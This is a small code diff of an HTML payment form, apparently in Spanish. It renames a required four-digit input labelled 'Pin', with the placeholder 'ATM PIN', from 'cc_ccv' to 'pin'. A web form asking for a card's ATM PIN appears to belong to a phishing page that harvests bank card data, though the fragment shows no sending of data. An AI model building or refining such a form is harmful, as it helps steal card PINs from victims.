@@ -553,7 +553,7 @@ C&oacute;digo de seguridad
 <span class="obligatorio" title="Campo Obligatorio">*</span>
 Pin
 </label>
-<input type="text" name="cc_ccv" id="cc_ccv" value="" pattern = "[0-9]*" maxlength="4" size="9" placeholder="ATM PIN" autocomplete="off" required="" style="
+<input type="text" name="pin" id="pin" value="" pattern = "[0-9]*" maxlength="4" size="9" placeholder="ATM PIN" autocomplete="off" required="" style="
     width: 206px;
 ">
 
